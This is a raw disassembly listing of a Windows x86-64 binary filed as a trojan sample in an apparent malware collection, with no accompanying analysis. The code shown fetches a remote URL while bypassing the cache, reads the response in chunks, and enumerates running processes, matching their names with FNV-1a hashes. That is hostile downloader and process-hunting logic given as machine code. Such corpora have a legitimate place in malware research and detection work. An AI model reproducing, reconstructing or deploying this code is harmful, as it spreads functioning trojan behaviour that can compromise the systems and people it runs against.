
malware_samples/trojan/32e42cc1d96e74c846980329625321dba66ad53331196e0b8f3b5fdacff0fb66.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   180001007:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000100a:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   18000100f:	66 0f 6f 0d 39 48 00 	movdqa 0x4839(%rip),%xmm1        # 0x180005850
   180001016:	00 
   180001017:	66 0f 7f 4c 24 30    	movdqa %xmm1,0x30(%rsp)
   18000101d:	f2 0f 10 05 bb 43 00 	movsd  0x43bb(%rip),%xmm0        # 0x1800053e0
   180001024:	00 
   180001025:	f2 0f 11 44 24 20    	movsd  %xmm0,0x20(%rsp)
   18000102b:	0f b7 05 b6 43 00 00 	movzwl 0x43b6(%rip),%eax        # 0x1800053e8
   180001032:	66 89 44 24 28       	mov    %ax,0x28(%rsp)
   180001037:	0f b6 05 ac 43 00 00 	movzbl 0x43ac(%rip),%eax        # 0x1800053ea
   18000103e:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   180001042:	c6 44 24 2b 00       	movb   $0x0,0x2b(%rsp)
   180001047:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000104a:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   18000104f:	0f 57 c9             	xorps  %xmm1,%xmm1
   180001052:	66 0f 7f 4c 24 50    	movdqa %xmm1,0x50(%rsp)
   180001058:	b9 20 00 00 00       	mov    $0x20,%ecx
   18000105d:	e8 7e 23 00 00       	call   0x1800033e0
   180001062:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180001067:	66 0f 6f 05 f1 47 00 	movdqa 0x47f1(%rip),%xmm0        # 0x180005860
   18000106e:	00 
   18000106f:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   180001075:	0f 10 0d 74 43 00 00 	movups 0x4374(%rip),%xmm1        # 0x1800053f0
   18000107c:	0f 11 08             	movups %xmm1,(%rax)
   18000107f:	0f b6 0d 7a 43 00 00 	movzbl 0x437a(%rip),%ecx        # 0x180005400
   180001086:	88 48 10             	mov    %cl,0x10(%rax)
   180001089:	c6 40 11 00          	movb   $0x0,0x11(%rax)
   18000108d:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001090:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   180001095:	0f 57 c9             	xorps  %xmm1,%xmm1
   180001098:	66 0f 7f 4c 24 70    	movdqa %xmm1,0x70(%rsp)
   18000109e:	b9 20 00 00 00       	mov    $0x20,%ecx
   1800010a3:	e8 38 23 00 00       	call   0x1800033e0
   1800010a8:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800010ad:	66 0f 6f 05 bb 47 00 	movdqa 0x47bb(%rip),%xmm0        # 0x180005870
   1800010b4:	00 
   1800010b5:	66 0f 7f 44 24 70    	movdqa %xmm0,0x70(%rsp)
   1800010bb:	0f 10 0d 46 43 00 00 	movups 0x4346(%rip),%xmm1        # 0x180005408
   1800010c2:	0f 11 08             	movups %xmm1,(%rax)
   1800010c5:	0f b7 0d 4c 43 00 00 	movzwl 0x434c(%rip),%ecx        # 0x180005418
   1800010cc:	66 89 48 10          	mov    %cx,0x10(%rax)
   1800010d0:	c6 40 12 00          	movb   $0x0,0x12(%rax)
   1800010d4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800010d7:	f3 0f 7f 05 79 66 00 	movdqu %xmm0,0x6679(%rip)        # 0x180007758
   1800010de:	00 
   1800010df:	48 c7 05 7e 66 00 00 	movq   $0x0,0x667e(%rip)        # 0x180007768
   1800010e6:	00 00 00 00 
   1800010ea:	b9 60 00 00 00       	mov    $0x60,%ecx
   1800010ef:	e8 ec 22 00 00       	call   0x1800033e0
   1800010f4:	48 89 05 5d 66 00 00 	mov    %rax,0x665d(%rip)        # 0x180007758
   1800010fb:	48 89 05 5e 66 00 00 	mov    %rax,0x665e(%rip)        # 0x180007760
   180001102:	48 8d 48 60          	lea    0x60(%rax),%rcx
   180001106:	48 89 0d 5b 66 00 00 	mov    %rcx,0x665b(%rip)        # 0x180007768
   18000110d:	4c 8d 0d 44 66 00 00 	lea    0x6644(%rip),%r9        # 0x180007758
   180001114:	4c 89 8c 24 90 00 00 	mov    %r9,0x90(%rsp)
   18000111b:	00 
   18000111c:	4c 8b c0             	mov    %rax,%r8
   18000111f:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   180001126:	00 
   180001127:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000112c:	e8 4f 0f 00 00       	call   0x180002080
   180001131:	48 89 05 28 66 00 00 	mov    %rax,0x6628(%rip)        # 0x180007760
   180001138:	4c 8d 0d 91 09 00 00 	lea    0x991(%rip),%r9        # 0x180001ad0
   18000113f:	ba 20 00 00 00       	mov    $0x20,%edx
   180001144:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   18000114a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000114f:	e8 c8 22 00 00       	call   0x18000341c
   180001154:	48 8d 0d 25 36 00 00 	lea    0x3625(%rip),%rcx        # 0x180004780
   18000115b:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   180001162:	e9 d5 26 00 00       	jmp    0x18000383c
   180001167:	cc                   	int3
   180001168:	cc                   	int3
   180001169:	cc                   	int3
   18000116a:	cc                   	int3
   18000116b:	cc                   	int3
   18000116c:	cc                   	int3
   18000116d:	cc                   	int3
   18000116e:	cc                   	int3
   18000116f:	cc                   	int3
   180001170:	40 53                	rex push %rbx
   180001172:	48 83 ec 20          	sub    $0x20,%rsp
   180001176:	48 8b d9             	mov    %rcx,%rbx
   180001179:	48 8b c2             	mov    %rdx,%rax
   18000117c:	48 8d 0d 9d 41 00 00 	lea    0x419d(%rip),%rcx        # 0x180005320
   180001183:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001186:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000118a:	48 89 0b             	mov    %rcx,(%rbx)
   18000118d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001191:	0f 11 02             	movups %xmm0,(%rdx)
   180001194:	ff 15 9e 3f 00 00    	call   *0x3f9e(%rip)        # 0x180005138
   18000119a:	48 8b c3             	mov    %rbx,%rax
   18000119d:	48 83 c4 20          	add    $0x20,%rsp
   1800011a1:	5b                   	pop    %rbx
   1800011a2:	c3                   	ret
   1800011a3:	cc                   	int3
   1800011a4:	cc                   	int3
   1800011a5:	cc                   	int3
   1800011a6:	cc                   	int3
   1800011a7:	cc                   	int3
   1800011a8:	cc                   	int3
   1800011a9:	cc                   	int3
   1800011aa:	cc                   	int3
   1800011ab:	cc                   	int3
   1800011ac:	cc                   	int3
   1800011ad:	cc                   	int3
   1800011ae:	cc                   	int3
   1800011af:	cc                   	int3
   1800011b0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1800011b4:	48 8d 05 b5 41 00 00 	lea    0x41b5(%rip),%rax        # 0x180005370
   1800011bb:	48 85 d2             	test   %rdx,%rdx
   1800011be:	48 0f 45 c2          	cmovne %rdx,%rax
   1800011c2:	c3                   	ret
   1800011c3:	cc                   	int3
   1800011c4:	cc                   	int3
   1800011c5:	cc                   	int3
   1800011c6:	cc                   	int3
   1800011c7:	cc                   	int3
   1800011c8:	cc                   	int3
   1800011c9:	cc                   	int3
   1800011ca:	cc                   	int3
   1800011cb:	cc                   	int3
   1800011cc:	cc                   	int3
   1800011cd:	cc                   	int3
   1800011ce:	cc                   	int3
   1800011cf:	cc                   	int3
   1800011d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800011d5:	57                   	push   %rdi
   1800011d6:	48 83 ec 20          	sub    $0x20,%rsp
   1800011da:	48 8d 05 3f 41 00 00 	lea    0x413f(%rip),%rax        # 0x180005320
   1800011e1:	48 8b f9             	mov    %rcx,%rdi
   1800011e4:	48 89 01             	mov    %rax,(%rcx)
   1800011e7:	8b da                	mov    %edx,%ebx
   1800011e9:	48 83 c1 08          	add    $0x8,%rcx
   1800011ed:	ff 15 35 3f 00 00    	call   *0x3f35(%rip)        # 0x180005128
   1800011f3:	f6 c3 01             	test   $0x1,%bl
   1800011f6:	74 0d                	je     0x180001205
   1800011f8:	ba 18 00 00 00       	mov    $0x18,%edx
   1800011fd:	48 8b cf             	mov    %rdi,%rcx
   180001200:	e8 4f 26 00 00       	call   0x180003854
   180001205:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000120a:	48 8b c7             	mov    %rdi,%rax
   18000120d:	48 83 c4 20          	add    $0x20,%rsp
   180001211:	5f                   	pop    %rdi
   180001212:	c3                   	ret
   180001213:	cc                   	int3
   180001214:	cc                   	int3
   180001215:	cc                   	int3
   180001216:	cc                   	int3
   180001217:	cc                   	int3
   180001218:	cc                   	int3
   180001219:	cc                   	int3
   18000121a:	cc                   	int3
   18000121b:	cc                   	int3
   18000121c:	cc                   	int3
   18000121d:	cc                   	int3
   18000121e:	cc                   	int3
   18000121f:	cc                   	int3
   180001220:	48 8d 05 f9 40 00 00 	lea    0x40f9(%rip),%rax        # 0x180005320
   180001227:	48 89 01             	mov    %rax,(%rcx)
   18000122a:	48 83 c1 08          	add    $0x8,%rcx
   18000122e:	48 ff 25 f3 3e 00 00 	rex.W jmp *0x3ef3(%rip)        # 0x180005128
   180001235:	cc                   	int3
   180001236:	cc                   	int3
   180001237:	cc                   	int3
   180001238:	cc                   	int3
   180001239:	cc                   	int3
   18000123a:	cc                   	int3
   18000123b:	cc                   	int3
   18000123c:	cc                   	int3
   18000123d:	cc                   	int3
   18000123e:	cc                   	int3
   18000123f:	cc                   	int3
   180001240:	48 8d 05 41 41 00 00 	lea    0x4141(%rip),%rax        # 0x180005388
   180001247:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000124e:	00 
   18000124f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001253:	48 8d 05 06 41 00 00 	lea    0x4106(%rip),%rax        # 0x180005360
   18000125a:	48 89 01             	mov    %rax,(%rcx)
   18000125d:	48 8b c1             	mov    %rcx,%rax
   180001260:	c3                   	ret
   180001261:	cc                   	int3
   180001262:	cc                   	int3
   180001263:	cc                   	int3
   180001264:	cc                   	int3
   180001265:	cc                   	int3
   180001266:	cc                   	int3
   180001267:	cc                   	int3
   180001268:	cc                   	int3
   180001269:	cc                   	int3
   18000126a:	cc                   	int3
   18000126b:	cc                   	int3
   18000126c:	cc                   	int3
   18000126d:	cc                   	int3
   18000126e:	cc                   	int3
   18000126f:	cc                   	int3
   180001270:	48 83 ec 48          	sub    $0x48,%rsp
   180001274:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001279:	e8 c2 ff ff ff       	call   0x180001240
   18000127e:	48 8d 15 2b 54 00 00 	lea    0x542b(%rip),%rdx        # 0x1800066b0
   180001285:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000128a:	e8 a9 30 00 00       	call   0x180004338
   18000128f:	cc                   	int3
   180001290:	40 53                	rex push %rbx
   180001292:	48 83 ec 20          	sub    $0x20,%rsp
   180001296:	48 8b d9             	mov    %rcx,%rbx
   180001299:	48 8b c2             	mov    %rdx,%rax
   18000129c:	48 8d 0d 7d 40 00 00 	lea    0x407d(%rip),%rcx        # 0x180005320
   1800012a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800012a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800012aa:	48 89 0b             	mov    %rcx,(%rbx)
   1800012ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800012b1:	0f 11 02             	movups %xmm0,(%rdx)
   1800012b4:	ff 15 7e 3e 00 00    	call   *0x3e7e(%rip)        # 0x180005138
   1800012ba:	48 8d 05 9f 40 00 00 	lea    0x409f(%rip),%rax        # 0x180005360
   1800012c1:	48 89 03             	mov    %rax,(%rbx)
   1800012c4:	48 8b c3             	mov    %rbx,%rax
   1800012c7:	48 83 c4 20          	add    $0x20,%rsp
   1800012cb:	5b                   	pop    %rbx
   1800012cc:	c3                   	ret
   1800012cd:	cc                   	int3
   1800012ce:	cc                   	int3
   1800012cf:	cc                   	int3
   1800012d0:	40 53                	rex push %rbx
   1800012d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800012d6:	48 8b d9             	mov    %rcx,%rbx
   1800012d9:	48 8b c2             	mov    %rdx,%rax
   1800012dc:	48 8d 0d 3d 40 00 00 	lea    0x403d(%rip),%rcx        # 0x180005320
   1800012e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800012e6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800012ea:	48 89 0b             	mov    %rcx,(%rbx)
   1800012ed:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800012f1:	0f 11 02             	movups %xmm0,(%rdx)
   1800012f4:	ff 15 3e 3e 00 00    	call   *0x3e3e(%rip)        # 0x180005138
   1800012fa:	48 8d 05 37 40 00 00 	lea    0x4037(%rip),%rax        # 0x180005338
   180001301:	48 89 03             	mov    %rax,(%rbx)
   180001304:	48 8b c3             	mov    %rbx,%rax
   180001307:	48 83 c4 20          	add    $0x20,%rsp
   18000130b:	5b                   	pop    %rbx
   18000130c:	c3                   	ret
   18000130d:	cc                   	int3
   18000130e:	cc                   	int3
   18000130f:	cc                   	int3
   180001310:	48 83 ec 28          	sub    $0x28,%rsp
   180001314:	48 8d 0d 85 40 00 00 	lea    0x4085(%rip),%rcx        # 0x1800053a0
   18000131b:	ff 15 e7 3d 00 00    	call   *0x3de7(%rip)        # 0x180005108
   180001321:	cc                   	int3
   180001322:	cc                   	int3
   180001323:	cc                   	int3
   180001324:	cc                   	int3
   180001325:	cc                   	int3
   180001326:	cc                   	int3
   180001327:	cc                   	int3
   180001328:	cc                   	int3
   180001329:	cc                   	int3
   18000132a:	cc                   	int3
   18000132b:	cc                   	int3
   18000132c:	cc                   	int3
   18000132d:	cc                   	int3
   18000132e:	cc                   	int3
   18000132f:	cc                   	int3
   180001330:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001335:	55                   	push   %rbp
   180001336:	56                   	push   %rsi
   180001337:	57                   	push   %rdi
   180001338:	b8 60 20 00 00       	mov    $0x2060,%eax
   18000133d:	e8 7e 31 00 00       	call   0x1800044c0
   180001342:	48 2b e0             	sub    %rax,%rsp
   180001345:	48 8b 05 f4 5c 00 00 	mov    0x5cf4(%rip),%rax        # 0x180007040
   18000134c:	48 33 c4             	xor    %rsp,%rax
   18000134f:	48 89 84 24 50 20 00 	mov    %rax,0x2050(%rsp)
   180001356:	00 
   180001357:	48 8b fa             	mov    %rdx,%rdi
   18000135a:	48 8b d9             	mov    %rcx,%rbx
   18000135d:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   180001362:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   180001369:	00 
   18000136a:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000136d:	0f 11 01             	movups %xmm0,(%rcx)
   180001370:	33 ed                	xor    %ebp,%ebp
   180001372:	48 89 29             	mov    %rbp,(%rcx)
   180001375:	48 89 69 08          	mov    %rbp,0x8(%rcx)
   180001379:	48 89 69 10          	mov    %rbp,0x10(%rcx)
   18000137d:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   180001384:	00 
   180001385:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   180001389:	45 33 c9             	xor    %r9d,%r9d
   18000138c:	45 33 c0             	xor    %r8d,%r8d
   18000138f:	ba 01 00 00 00       	mov    $0x1,%edx
   180001394:	48 8d 0d 15 40 00 00 	lea    0x4015(%rip),%rcx        # 0x1800053b0
   18000139b:	ff 15 f7 3d 00 00    	call   *0x3df7(%rip)        # 0x180005198
   1800013a1:	48 8b f0             	mov    %rax,%rsi
   1800013a4:	48 85 c0             	test   %rax,%rax
   1800013a7:	0f 84 a3 00 00 00    	je     0x180001450
   1800013ad:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   1800013b2:	76 03                	jbe    0x1800013b7
   1800013b4:	48 8b 3f             	mov    (%rdi),%rdi
   1800013b7:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1800013bc:	c7 44 24 20 00 00 80 	movl   $0x84800000,0x20(%rsp)
   1800013c3:	84 
   1800013c4:	45 33 c9             	xor    %r9d,%r9d
   1800013c7:	45 33 c0             	xor    %r8d,%r8d
   1800013ca:	48 8b d7             	mov    %rdi,%rdx
   1800013cd:	48 8b ce             	mov    %rsi,%rcx
   1800013d0:	ff 15 aa 3d 00 00    	call   *0x3daa(%rip)        # 0x180005180
   1800013d6:	48 8b f8             	mov    %rax,%rdi
   1800013d9:	48 85 c0             	test   %rax,%rax
   1800013dc:	74 68                	je     0x180001446
   1800013de:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   1800013e2:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800013e7:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   1800013ed:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800013f2:	48 8b c8             	mov    %rax,%rcx
   1800013f5:	ff 15 8d 3d 00 00    	call   *0x3d8d(%rip)        # 0x180005188
   1800013fb:	85 c0                	test   %eax,%eax
   1800013fd:	74 3e                	je     0x18000143d
   1800013ff:	90                   	nop
   180001400:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180001404:	85 c0                	test   %eax,%eax
   180001406:	74 35                	je     0x18000143d
   180001408:	44 8b c8             	mov    %eax,%r9d
   18000140b:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   18000140f:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001414:	48 8b cb             	mov    %rbx,%rcx
   180001417:	e8 34 07 00 00       	call   0x180001b50
   18000141c:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   180001420:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180001425:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   18000142b:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180001430:	48 8b cf             	mov    %rdi,%rcx
   180001433:	ff 15 4f 3d 00 00    	call   *0x3d4f(%rip)        # 0x180005188
   180001439:	85 c0                	test   %eax,%eax
   18000143b:	75 c3                	jne    0x180001400
   18000143d:	48 8b cf             	mov    %rdi,%rcx
   180001440:	ff 15 4a 3d 00 00    	call   *0x3d4a(%rip)        # 0x180005190
   180001446:	48 8b ce             	mov    %rsi,%rcx
   180001449:	ff 15 41 3d 00 00    	call   *0x3d41(%rip)        # 0x180005190
   18000144f:	90                   	nop
   180001450:	48 8b c3             	mov    %rbx,%rax
   180001453:	48 8b 8c 24 50 20 00 	mov    0x2050(%rsp),%rcx
   18000145a:	00 
   18000145b:	48 33 cc             	xor    %rsp,%rcx
   18000145e:	e8 5d 1f 00 00       	call   0x1800033c0
   180001463:	48 8b 9c 24 90 20 00 	mov    0x2090(%rsp),%rbx
   18000146a:	00 
   18000146b:	48 81 c4 60 20 00 00 	add    $0x2060,%rsp
   180001472:	5f                   	pop    %rdi
   180001473:	5e                   	pop    %rsi
   180001474:	5d                   	pop    %rbp
   180001475:	c3                   	ret
   180001476:	cc                   	int3
   180001477:	cc                   	int3
   180001478:	cc                   	int3
   180001479:	cc                   	int3
   18000147a:	cc                   	int3
   18000147b:	cc                   	int3
   18000147c:	cc                   	int3
   18000147d:	cc                   	int3
   18000147e:	cc                   	int3
   18000147f:	cc                   	int3
   180001480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001485:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000148a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000148f:	55                   	push   %rbp
   180001490:	41 54                	push   %r12
   180001492:	41 55                	push   %r13
   180001494:	41 56                	push   %r14
   180001496:	41 57                	push   %r15
   180001498:	48 8d ac 24 d0 fe ff 	lea    -0x130(%rsp),%rbp
   18000149f:	ff 
   1800014a0:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   1800014a7:	48 8b 05 92 5b 00 00 	mov    0x5b92(%rip),%rax        # 0x180007040
   1800014ae:	48 33 c4             	xor    %rsp,%rax
   1800014b1:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   1800014b8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800014bb:	33 c0                	xor    %eax,%eax
   1800014bd:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   1800014c2:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1800014c7:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   1800014cc:	0f 57 c9             	xorps  %xmm1,%xmm1
   1800014cf:	f3 0f 7f 4d 80       	movdqu %xmm1,-0x80(%rbp)
   1800014d4:	b9 30 00 00 00       	mov    $0x30,%ecx
   1800014d9:	e8 02 1f 00 00       	call   0x1800033e0
   1800014de:	48 8b d0             	mov    %rax,%rdx
   1800014e1:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1800014e6:	66 0f 6f 05 92 43 00 	movdqa 0x4392(%rip),%xmm0        # 0x180005880
   1800014ed:	00 
   1800014ee:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   1800014f3:	0f 10 05 26 3f 00 00 	movups 0x3f26(%rip),%xmm0        # 0x180005420
   1800014fa:	0f 11 00             	movups %xmm0,(%rax)
   1800014fd:	0f 10 0d 2c 3f 00 00 	movups 0x3f2c(%rip),%xmm1        # 0x180005430
   180001504:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   180001508:	0f b7 0d 31 3f 00 00 	movzwl 0x3f31(%rip),%ecx        # 0x180005440
   18000150f:	66 89 48 20          	mov    %cx,0x20(%rax)
   180001513:	0f b6 05 28 3f 00 00 	movzbl 0x3f28(%rip),%eax        # 0x180005442
   18000151a:	88 42 22             	mov    %al,0x22(%rdx)
   18000151d:	c6 42 23 00          	movb   $0x0,0x23(%rdx)
   180001521:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180001526:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   18000152b:	e8 00 fe ff ff       	call   0x180001330
   180001530:	90                   	nop
   180001531:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   180001535:	48 83 fa 0f          	cmp    $0xf,%rdx
   180001539:	76 47                	jbe    0x180001582
   18000153b:	48 ff c2             	inc    %rdx
   18000153e:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   180001543:	48 8b c1             	mov    %rcx,%rax
   180001546:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000154d:	72 2e                	jb     0x18000157d
   18000154f:	48 83 c2 27          	add    $0x27,%rdx
   180001553:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001557:	48 2b c1             	sub    %rcx,%rax
   18000155a:	48 83 e8 08          	sub    $0x8,%rax
   18000155e:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001562:	76 19                	jbe    0x18000157d
   180001564:	45 33 f6             	xor    %r14d,%r14d
   180001567:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   18000156c:	45 33 c9             	xor    %r9d,%r9d
   18000156f:	45 33 c0             	xor    %r8d,%r8d
   180001572:	33 d2                	xor    %edx,%edx
   180001574:	33 c9                	xor    %ecx,%ecx
   180001576:	ff 15 94 3c 00 00    	call   *0x3c94(%rip)        # 0x180005210
   18000157c:	cc                   	int3
   18000157d:	e8 d2 22 00 00       	call   0x180003854
   180001582:	66 0f 6f 05 b6 42 00 	movdqa 0x42b6(%rip),%xmm0        # 0x180005840
   180001589:	00 
   18000158a:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   18000158f:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   180001594:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001599:	48 3b 4c 24 60       	cmp    0x60(%rsp),%rcx
   18000159e:	75 7c                	jne    0x18000161c
   1800015a0:	48 85 c9             	test   %rcx,%rcx
   1800015a3:	74 47                	je     0x1800015ec
   1800015a5:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1800015aa:	48 2b d1             	sub    %rcx,%rdx
   1800015ad:	48 8b c1             	mov    %rcx,%rax
   1800015b0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800015b7:	72 2e                	jb     0x1800015e7
   1800015b9:	48 83 c2 27          	add    $0x27,%rdx
   1800015bd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800015c1:	48 2b c1             	sub    %rcx,%rax
   1800015c4:	48 83 e8 08          	sub    $0x8,%rax
   1800015c8:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800015cc:	76 19                	jbe    0x1800015e7
   1800015ce:	45 33 f6             	xor    %r14d,%r14d
   1800015d1:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1800015d6:	45 33 c9             	xor    %r9d,%r9d
   1800015d9:	45 33 c0             	xor    %r8d,%r8d
   1800015dc:	33 d2                	xor    %edx,%edx
   1800015de:	33 c9                	xor    %ecx,%ecx
   1800015e0:	ff 15 2a 3c 00 00    	call   *0x3c2a(%rip)        # 0x180005210
   1800015e6:	cc                   	int3
   1800015e7:	e8 68 22 00 00       	call   0x180003854
   1800015ec:	48 8b 8d 20 01 00 00 	mov    0x120(%rbp),%rcx
   1800015f3:	48 33 cc             	xor    %rsp,%rcx
   1800015f6:	e8 c5 1d 00 00       	call   0x1800033c0
   1800015fb:	4c 8d 9c 24 30 02 00 	lea    0x230(%rsp),%r11
   180001602:	00 
   180001603:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180001607:	49 8b 73 38          	mov    0x38(%r11),%rsi
   18000160b:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   18000160f:	49 8b e3             	mov    %r11,%rsp
   180001612:	41 5f                	pop    %r15
   180001614:	41 5e                	pop    %r14
   180001616:	41 5d                	pop    %r13
   180001618:	41 5c                	pop    %r12
   18000161a:	5d                   	pop    %rbp
   18000161b:	c3                   	ret
   18000161c:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000161f:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   180001623:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   180001627:	0f 11 45 d0          	movups %xmm0,-0x30(%rbp)
   18000162b:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   18000162f:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
   180001636:	45 33 f6             	xor    %r14d,%r14d
   180001639:	4c 89 75 b8          	mov    %r14,-0x48(%rbp)
   18000163d:	4c 89 75 c0          	mov    %r14,-0x40(%rbp)
   180001641:	b9 18 00 00 00       	mov    $0x18,%ecx
   180001646:	e8 95 1d 00 00       	call   0x1800033e0
   18000164b:	48 89 00             	mov    %rax,(%rax)
   18000164e:	48 89 40 08          	mov    %rax,0x8(%rax)
   180001652:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   180001656:	4c 89 75 c8          	mov    %r14,-0x38(%rbp)
   18000165a:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000165d:	66 0f 7f 45 d0       	movdqa %xmm0,-0x30(%rbp)
   180001662:	48 c7 45 e0 07 00 00 	movq   $0x7,-0x20(%rbp)
   180001669:	00 
   18000166a:	48 c7 45 e8 08 00 00 	movq   $0x8,-0x18(%rbp)
   180001671:	00 
   180001672:	c7 45 b0 00 00 80 3f 	movl   $0x3f800000,-0x50(%rbp)
   180001679:	4c 8b c0             	mov    %rax,%r8
   18000167c:	ba 10 00 00 00       	mov    $0x10,%edx
   180001681:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   180001685:	e8 56 0c 00 00       	call   0x1800022e0
   18000168a:	90                   	nop
   18000168b:	49 bd 25 23 22 84 e4 	movabs $0xcbf29ce484222325,%r13
   180001692:	9c f2 cb 
   180001695:	49 bc b3 01 00 00 00 	movabs $0x100000001b3,%r12
   18000169c:	01 00 00 
   18000169f:	90                   	nop
   1800016a0:	48 8b 35 b1 60 00 00 	mov    0x60b1(%rip),%rsi        # 0x180007758
   1800016a7:	4c 8b 3d b2 60 00 00 	mov    0x60b2(%rip),%r15        # 0x180007760
   1800016ae:	49 3b f7             	cmp    %r15,%rsi
   1800016b1:	0f 84 ad 00 00 00    	je     0x180001764
   1800016b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800016be:	00 00 
   1800016c0:	48 8b fe             	mov    %rsi,%rdi
   1800016c3:	48 83 7e 18 0f       	cmpq   $0xf,0x18(%rsi)
   1800016c8:	76 03                	jbe    0x1800016cd
   1800016ca:	48 8b 3e             	mov    (%rsi),%rdi
   1800016cd:	c7 45 f0 30 01 00 00 	movl   $0x130,-0x10(%rbp)
   1800016d4:	33 d2                	xor    %edx,%edx
   1800016d6:	b9 02 00 00 00       	mov    $0x2,%ecx
   1800016db:	ff 15 2f 39 00 00    	call   *0x392f(%rip)        # 0x180005010
   1800016e1:	48 8b d8             	mov    %rax,%rbx
   1800016e4:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1800016e8:	48 8b c8             	mov    %rax,%rcx
   1800016eb:	ff 15 0f 39 00 00    	call   *0x390f(%rip)        # 0x180005000
   1800016f1:	83 f8 01             	cmp    $0x1,%eax
   1800016f4:	75 53                	jne    0x180001749
   1800016f6:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1800016fa:	48 8b cb             	mov    %rbx,%rcx
   1800016fd:	ff 15 1d 39 00 00    	call   *0x391d(%rip)        # 0x180005020
   180001703:	83 f8 01             	cmp    $0x1,%eax
   180001706:	75 41                	jne    0x180001749
